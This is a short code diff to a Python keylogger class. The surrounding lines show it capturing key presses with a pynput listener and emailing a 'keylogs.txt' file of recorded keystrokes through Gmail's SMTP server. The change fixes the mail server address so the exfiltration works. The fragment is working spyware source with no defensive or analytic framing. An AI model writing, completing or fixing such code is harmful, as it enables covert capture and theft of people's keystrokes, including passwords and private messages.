@@ -37,12 +37,11 @@ class KeyLogger():
             with open('keylogs.txt', 'rb') as file:
                 message.add_attachment(file.read(),maintype=mime_type,subtype=mime_subtype,filename='keylogs.txt')
 
-            mail_server = smtplib.SMTP_SSL('smail.com')
+            mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
             mail_server.set_debuglevel(1)
             mail_server.login("pythonproject.py@gmail.com", '') 
             mail_server.send_message(message)
-            mail_server.quit() 
-            
+            mail_server.quit()
                   
     def main(self):
         with Listener(on_press=self.on_press,on_release=self.on_release) as listener:
